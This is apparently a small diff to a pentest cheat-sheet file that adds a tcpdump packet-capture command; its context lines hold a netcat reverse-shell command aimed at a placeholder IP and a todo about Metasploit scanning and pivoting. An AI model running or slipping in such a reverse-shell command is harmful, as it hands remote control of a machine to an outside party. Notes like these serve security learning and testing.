@@ -15,3 +15,6 @@ use netcat to spawn a reverse shell:
 ``nc -e /bin/sh SOME-IP-ADDRESS 80``
 
 todo: add metasploit/bash automated scanner, pivoting examples(post exploitation)
+
+Packet Inspection detecting source traffic on specific port:
+``tcpdump tcp port 443 -w dump.pcap -i eth0``
